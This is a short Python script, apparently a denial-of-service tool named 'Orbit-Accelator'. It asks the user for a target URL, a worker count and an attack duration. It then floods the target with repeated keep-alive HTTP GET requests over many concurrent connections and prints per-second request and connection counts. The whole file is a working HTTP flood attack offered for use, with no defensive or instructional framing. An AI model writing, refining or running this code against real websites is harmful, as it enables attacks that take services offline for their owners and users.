import asyncio
from asyncio import open_connection, create_task, Event, sleep, run
from yarl import URL
from contextlib import suppress

pps, cps = 0, 0
pps_lock = asyncio.Lock()
cps_lock = asyncio.Lock()

# ANSI
BLUE = '\033[94m'
ENDC = '\033[0m'

async def work(target: URL, payload: bytes, event: Event, rpc: int = 100):
    global pps, cps
    await event.wait()

    while event.is_set():
        with suppress(Exception):
            r, w = await open_connection(target.host, target.port or 80, ssl=target.scheme == "https")
            async with cps_lock:
                cps += 1
            for _ in range(rpc):
                w.write(payload)
                await w.drain()
                async with pps_lock:
                    pps += 1

async def main():
    global pps, cps

    try:
        target_url = input(f"{BLUE}[Orbit-Accelator]{ENDC} Target? http://example.com : ")
        target = URL(target_url)
        workers = int(input(f"{BLUE}[Orbit-Accelator]{ENDC} CPU Workers (60): "))
        timer = int(input(f"{BLUE}[Orbit-Accelator]{ENDC} Attack duration (seconds) : "))
        rpc = workers * 10

        event = Event()

        payload = (
            f"GET {target.raw_path_qs} HTTP/1.1\r\n"
            f"Host: {target.raw_authority}\r\n"
            "Connection: keep-alive\r\n"
            "\r\n").encode()

        event.clear()

        for _ in range(workers):
            create_task(work(target, payload, event, rpc))
            await sleep(.0)

        event.set()
        print("Started - %s" % target.human_repr())

        while timer:
            async with pps_lock, cps_lock:
                current_pps, current_cps = pps, cps
                pps, cps = 0, 0
            await sleep(1)
            timer -= 1
            print(f"PPS: {current_pps:,} | CPS: {current_cps:,} | Time Remaining: {timer:,}s")
        event.clear()
    except AssertionError as e:
        print(str(e) or repr(e))

run(main())
